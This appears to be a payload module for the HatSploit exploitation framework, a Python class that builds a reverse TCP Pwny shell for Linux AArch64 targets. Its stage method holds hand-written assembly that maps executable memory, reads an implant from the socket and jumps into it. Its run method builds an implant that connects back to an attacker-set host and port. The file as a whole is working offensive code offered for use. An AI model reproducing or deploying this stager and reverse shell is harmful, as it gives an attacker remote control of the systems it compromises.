
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import io

from pwny import Pwny
from pwny.session import PwnySession

from elftools.elf.elffile import ELFFile

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux aarch64 Pwny Reverse TCP",
            'Payload': "linux/aarch64/pwny_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive reverse Pwny shell for Linux "
                "with AARCH64 architecture."
            ),
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Type': REVERSE_TCP,
        })

    def stage(self):
        implant = self.implant()
        length = len(implant)
        entry = ELFFile(io.BytesIO(implant)).header['e_entry']

        return self.__asm__(
            f"""
            start:
                adr x2, {hex(length)}
                ldr w2, [x2]
                mov x10, x2

                lsr x2, x2, 12
                add x2, x2, 1
                lsl x2, x2, 12

                mov x0, xzr
                mov x1, x2
                mov x2, 7
                mov x3, 34
                mov x4, xzr
                mov x5, xzr
                mov x8, 0xde
                svc 0

                mov x4, x10
                mov x3, x0
                mov x10, x0

            loop:
                mov x0, x12
                mov x1, x3
                mov x2, x4
                mov x8, 0x3f
                svc 0

                cbz w0, fail
                add x3, x3, x0
                subs x4, x4, x0
                bne loop

                adr x0, {hex(entry)}
                ldr x0, [x0]
                add x0, x0, x10
                mov x14, x0

                mov x0, sp
                and sp, x0, -16
                add sp, sp, 16*6
                mov x0, 2
                mov x1, 112
                str x1, [sp]
                mov x1, sp

                mov x2, x12
                mov x3, 0

                mov x4, 0
                mov x5, 7

                mov x6, x10
                mov x7, 6

                mov x8, 0x1000
                mov x9, 25

                mov x10, x10
                mov x11, 0

                stp x10, x11, [sp, -16]!
                stp x8, x9, [sp, -16]!
                stp x6, x7, [sp, -16]!
                stp x4, x5, [sp, -16]!
                stp x2, x3, [sp, -16]!

                mov x29, 0
                mov x30, 0
                br x14

            fail:
                mov x0, 0
                mov x8, 0x5d
                svc 0
            """
        )

    def implant(self):
        return Pwny(
            target='aarch64-linux-musl',
        ).to_binary('bin')

    def run(self):
        return Pwny(
            target='aarch64-linux-musl',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
